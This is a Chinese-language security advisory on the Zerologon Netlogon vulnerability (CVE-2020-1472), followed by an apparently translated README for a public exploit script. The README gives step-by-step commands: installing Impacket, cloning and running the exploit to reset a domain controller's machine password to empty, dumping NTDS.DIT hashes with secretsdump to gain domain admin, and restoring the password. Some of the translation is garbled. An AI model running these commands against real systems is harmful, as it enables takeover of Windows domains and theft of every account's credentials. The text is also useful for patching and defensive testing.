2020年8月12日，阿里云应急响应中心监测到，微软发布了补丁来修复NetLogon特权升级漏洞（CVE-2020-1472），CVSS评分为10，官方评级为严重。目前，微软已正式提供相应的每月安全补丁来修复此漏洞。

  

  2020年9月，一名外国黑客向Github公开上传了该漏洞的验证脚本PoC，并宣布了相关技术细节，这构成了很高的风险。

  

**漏洞描述**

  Microsoft在8月12日正式发布了安全更新，该更新修复了NetLogon特权升级漏洞（CVE-2020-1472）。攻击者使用NetLogon（MS-NRPC）与域控制器建立易受攻击的安全通道。何时可以使用此漏洞来访问域管理。成功利用此漏洞的攻击者可以在网络中的设备上运行相应的代码或程序。同时，Microsoft的August补丁还涉及许多其他高风险漏洞。阿里云应急响应中心提醒Windows用户尽快安装补丁，以防止漏洞攻击。

  

# CVE-2020-1472

CVE-2020-1472又名Zerologon的检查和利用代码

测试域控制器是否容易受到Zerologon攻击，如果容易受到攻击，它将把域控制器的帐户密码重置为空字符串。

注意：这可能会破坏生产环境中的内容（例如DNS功能，与复制域控制器的通信等）；然后，目标客户端将无法再向域进行身份验证，并且只能通过手动操作来重新同步它们。

Zerologon原创性的研究和白皮书由塞库拉（汤姆Tervoort） - https://www.secura.com/blog/zero-logon

# 利用

它将尝试执行Netlogon身份验证绕过。修补域控制器后，检测脚本将在发送2000对RPC调用后放弃，从而认为目标不容易受到攻击（错误的可能性为0.04％）。

仅当域控制器使用Active Directory中存储的密码来验证登录尝试，而不是本地存储的身份验证时，该漏洞利用才会成功，因为当以此方式更改密码时，只能在AD中进行更改。目标系统本身仍将在本地存储其原始密码。

## 安装

需要Python 3.7或更高版本，virtualenv，pip和 Impacket库的修改版本：nrpc.py（/ impacket / dcerpc / v5）来自GitHub的最新版本的impacket，其中添加了netlogon结构。

### 1.如下安装Impacket：

1.  `git clone https://github.com/SecureAuthCorp/impacket`
    
2.  `cd impacket`
    
3.  ```
    pwd
    ```
    
4.  `virtualenv --python=python3 impacket`
    
5.  `source impacket/bin/activate`
    
6.  `pip install --upgrade pip`
    
7.  `pip install .`
    

### 2.如下安装Zerologon漏洞脚本：

1.  ```
    
    ~/impacket/
    ```
    
2.  `cd example`
    
3.  `git clone https://github.com/VoidSec/CVE-2020-1472`
    
4.  `cd CVE-2020-1472`
    
5.  `pip install -r requirements.txt`
    

## 运行脚本

该脚本可用于定位DC或备用DC。它也可能会针对只读DC工作，但是尚未经过测试。DC名称应为其NetBIOS计算机名称。如果此名称不正确，则脚本可能会因`STATUS_INVALID_COMPUTER_NAME`错误而失败。给定一个名为`EXAMPLE-DC`和IP地址的域控制器`1.2.3.4`，按如下所示运行脚本：

*   `./cve-2020-1472-exploit.py -n EXAMPLE-DC -t 1.2.3.4`
    

运行该脚本应导致域控制器的帐户密码重置为空字符串。

在这一点上，您应该能够运行Impacket的`secretsdump.py -no-pass -just-dc Domain/'DC_NETBIOS_NAME$'@DC_IP_ADDR`（也可以使用空的hash ：）`-hashes :31d6cfe0d16ae931b73c59d7e0c089c0`，它将仅提取NTDS.DIT数据（NTLM哈希和Kerberos密钥）。

哪个应该让您获得域管理员。双赢双赢

### 示例运行

```
> cve-2020-1472-exploit.py -n WIN-U4Q9LLP6L2A -t 192.168.209.129
```

## 密码还原

要使DC继续正常运行，必须重新安装原始密码哈希。

获得Domain Admin之后，您可以`wmiexec.py`使用从secretsdump获得的凭据到目标DC，并执行以下步骤：

```
reg save HKLM\SYSTEM system.save
```

跑： `secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`

那应该向您显示计算机帐户的原始NT哈希。然后，您可以使用此处`reinstall_original_pw.py`提供的脚本将原始计算机帐户哈希值重新安装到域中。
